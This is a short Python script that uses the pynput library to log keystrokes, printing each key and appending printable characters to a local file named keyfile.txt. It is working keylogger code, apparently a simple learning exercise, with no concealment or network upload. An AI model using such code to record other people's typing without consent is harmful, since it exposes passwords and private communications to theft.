# Import the keybaord and mouse from pynput
from pynput import keyboard


def keyPressed(key):
	#converts key and passes to terminal
	print(str(key))
	# Creates and appends to keyfile
	with open("keyfile.txt", 'a') as logKey:
		try: 
			# Converts keys to char
			char = key.char
			logKey.write(char)
		except:
			#exception printing for special characters
			print("Error getting char")

#main method
if __name__ == "__main__":
	# Creates listener that passess keys pressed to keyPressed function
	listener = keyboard.Listener(on_press=keyPressed)
	# Starts listener and takes input
	listener.start()
	input()